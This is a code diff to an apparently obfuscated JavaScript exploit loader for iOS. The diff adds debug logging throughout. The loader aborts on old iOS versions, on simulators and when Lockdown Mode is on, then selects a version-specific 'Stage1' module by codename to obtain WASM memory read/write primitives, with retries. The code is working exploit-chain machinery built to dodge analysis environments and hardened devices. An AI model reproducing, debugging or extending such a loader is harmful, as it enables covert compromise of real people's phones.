@@ -465,52 +465,74 @@
             if (await platformModule.init("", fqMaGkNg(), "", Array(!1)[0], Array(!1)[0], platform, userAgent), platformModule.On()) throw Error("");
             window.log(`[PLATFORM] iOS version detected: ${platformModule.platformState.iOSVersion}`);
 
-            if (13E4 > platformModule.platformState.iOSVersion) return 1001;
+            if (13E4 > platformModule.platformState.iOSVersion) {
+                window.log(`[ABORT] iOS version ${platformModule.platformState.iOSVersion} is below 13.0 (130000)`);
+                return 1001;
+            }
 
             if (16E4 <= platformModule.platformState.iOSVersion) {
                 try {
+                    window.log(`[PLATFORM] Checking for simulator...`);
                     await platformModule.Hn();
                 } catch (p) {
-                    console.error(`[LOADER] ABORT: Simulator check threw`);
+                    window.log(`[ABORT] Simulator check threw: ${p.message}`);
                     return 1001
                 }
-                if (platformModule.platformState.Qn) return 1003;
+                if (platformModule.platformState.Qn) {
+                    window.log(`[ABORT] Simulator detected`);
+                    return 1003;
+                }
+                window.log(`[PLATFORM] Not a simulator`);
             }
 
             try {
+                window.log(`[PLATFORM] Checking for Lockdown Mode...`);
                 await platformModule.Yn();
+                window.log(`[PLATFORM] Lockdown Mode check passed`);
             } catch (e) {
-                console.error(`[LOADER] ABORT: Lockdown mode check failed`);
+                window.log(`[ABORT] Lockdown mode check failed: ${e.message}`);
                 return 1001;
             }
 
             let stage1Module;
             const offsets = platformModule.platformState.versionFlags;
 
-            window.log(`[LOADER] Selecting stage1 variant for offsets: JtEUci=${offsets.JtEUci}, KeCRDQ=${offsets.KeCRDQ}, ShQCsB=${offsets.ShQCsB}, RbKS6p=${offsets.RbKS6p}, mmrZ0r=${offsets.mmrZ0r}`);
+            window.log(`[LOADER] iOS version flags: JtEUci=${offsets.JtEUci}, KeCRDQ=${offsets.KeCRDQ}, ShQCsB=${offsets.ShQCsB}, RbKS6p=${offsets.RbKS6p}, mmrZ0r=${offsets.mmrZ0r}`);
             if (offsets.JtEUci) {
+                window.log(`[LOADER] Matched: iOS 16.6-17.2.1 (cassowary)`);
                 stage1Module = await globalThis.moduleManager.getModuleByURL(
                     "Stage1_16.6_17.2.1_cassowary"
                 );
             } else if (offsets.KeCRDQ) {
+                window.log(`[LOADER] Matched: iOS 16.2-16.5.1 (terrorbird)`);
                 stage1Module = await globalThis.moduleManager.getModuleByURL(
                     "Stage1_16.2_16.5.1_terrorbird"
                 );
             } else if (offsets.ShQCsB) {
+                window.log(`[LOADER] Matched: iOS 15.6-16.1.2 (bluebird)`);
                 stage1Module = await globalThis.moduleManager.getModuleByURL(
                     "Stage1_15.6_16.1.2_bluebird"
                 );
             } else if (offsets.RbKS6p) {
+                window.log(`[LOADER] Matched: iOS 15.2-15.5 (jacurutu)`);
                 stage1Module = await globalThis.moduleManager.getModuleByURL(
                     "Stage1_15.2_15.5_jacurutu"
                 );
             } else if (offsets.mmrZ0r) {
+                window.log(`[LOADER] Matched: older iOS version`);
                 stage1Module = await globalThis.moduleManager.getModuleByURL(
                     "7d8f5bae97f37aa318bccd652bf0c1dc38fd8396"
                 );
+            } else {
+                window.log(`[ABORT] No stage1 variant matched. Version may be unsupported`);
+                window.log(`[DEBUG] Full versionFlags: ${JSON.stringify(offsets)}`);
+                return 1001;
             }
 
-            if (void 0 === stage1Module) { console.error(`[LOADER] ABORT: No stage1 module matched`); return 1001; }
+            if (void 0 === stage1Module) { 
+                window.log(`[ABORT] Stage1 module failed to load`);
+                return 1001; 
+            }
             window.log(`[LOADER] Stage1 module loaded, executing WASM primitive exploit...`);
 
             await (async function executeStage1() {
@@ -529,11 +551,14 @@
                         console.error(e);
                     }
                 }
-                console.error(`[LOADER] Stage1 FAILED after 20 attempts`);
+                window.log(`[ABORT] Stage1 FAILED after 20 attempts`);
                 throw Error("");
             })();
 
-            if (!platformModule.platformState.exploitPrimitive) { console.error(`[LOADER] ABORT: WASM primitives not initialized`); throw Error(""); }
+            if (!platformModule.platformState.exploitPrimitive) { 
+                window.log(`[ABORT] WASM primitives not initialized after Stage1`);
+                throw Error(""); 
+            }
             window.log(`[LOADER] Stage1 complete — WASM read/write primitives active`);
 
             platform = 0;
